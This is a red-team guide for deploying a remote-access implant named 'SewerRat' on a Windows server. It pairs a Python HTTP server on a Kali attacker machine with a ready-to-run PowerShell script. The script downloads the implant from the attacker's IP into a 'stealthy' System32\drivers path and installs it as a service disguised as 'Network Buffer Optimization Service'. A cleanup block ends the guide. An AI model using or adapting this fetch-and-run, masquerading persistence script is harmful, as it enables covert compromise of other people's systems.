# HTTP & PowerShell Deployment Method

This guide provides an alternative to the Python SMB `deploy.py` script. It uses a lightweight HTTP server on the attacker machine (Kali) and a PowerShell script on the target Windows machine to download and execute the SewerRat implant via the Service Control Manager.

## 1. Attacker Machine (Kali Linux)

First, navigate to the directory containing your compiled `SewerRat.exe` implant (typically the `dist/` folder) and start a Python HTTP server.

```bash
# Navigate to where your payload is compiled
cd ~/Red-Team/Windows/sewerrat/dist

# Start up a basic Python web server on port 8080
python3 -m http.server 8080
```

## 2. Target Machine (Windows Server)

On the target machine, execute the following PowerShell script from an session where you have **Administrative privileges**. This script will:
1. Download the implant from your Kali machine over HTTP.
2. Save it to the stealthy path `C:\Windows\System32\drivers\SewerRat.exe`.
3. Create a quiet, demand-start Windows service to run the binary.
4. Execute the service.

Save the following as `deploy.ps1` on the target or paste it directly into an elevated PowerShell prompt:

```powershell
# ============================================================================
# SewerRat PowerShell Deployment Script
# REQUIRES: Administrator Privileges
# ============================================================================

$KaliIP = "192.168.1.223" # TODO: CHANGE THIS to your Kali IP
$KaliPort = "8080"
$ImplantURL = "http://${KaliIP}:${KaliPort}/dist/SewerRat.exe"
$DestPath = "C:\Windows\System32\drivers\SewerRat.exe"
$ServiceName = "Win32NetworkBuffer"

Write-Host "[*] Downloading SewerRat implant from $ImplantURL..."
try {
    Invoke-WebRequest -Uri $ImplantURL -OutFile $DestPath -UseBasicParsing
    Write-Host "[+] Download successful: $DestPath"
} catch {
    Write-Host "[-] Download failed: $_"
    exit
}

Write-Host "[*] Creating service '$ServiceName'..."
try {
    # If service already exists, stop and delete it first
    if (Get-Service -Name $ServiceName -ErrorAction SilentlyContinue) {
        Write-Host "[!] Service already exists. Cleaning up old service..."
        Stop-Service -Name $ServiceName -Force
        sc.exe delete $ServiceName
        Start-Sleep -Seconds 2
    }

    # Create the service pointing to our downloaded executable
    New-Service -Name $ServiceName `
                -BinaryPathName $DestPath `
                -StartupType Manual `
                -Description "Network Buffer Optimization Service" | Out-Null
                
    Write-Host "[+] Service created successfully."
} catch {
    Write-Host "[-] Failed to create service: $_"
    exit
}

Write-Host "[*] Starting service to execute implant..."
try {
    Start-Service -Name $ServiceName
    Write-Host "[+] Service started successfully! Implant is now running."
} catch {
    Write-Host "[-] Failed to start service: $_"
}
```

## 3. Cleanup 

To clean up the environment and remove persistent artifacts after testing, run the following from an administrative session:

```powershell
Stop-Service -Name "Win32NetworkBuffer" -ErrorAction SilentlyContinue
sc.exe delete "Win32NetworkBuffer"
Remove-Item -Path "C:\Windows\System32\drivers\SewerRat.exe" -Force -ErrorAction SilentlyContinue
Write-Host "[+] Cleanup complete."
```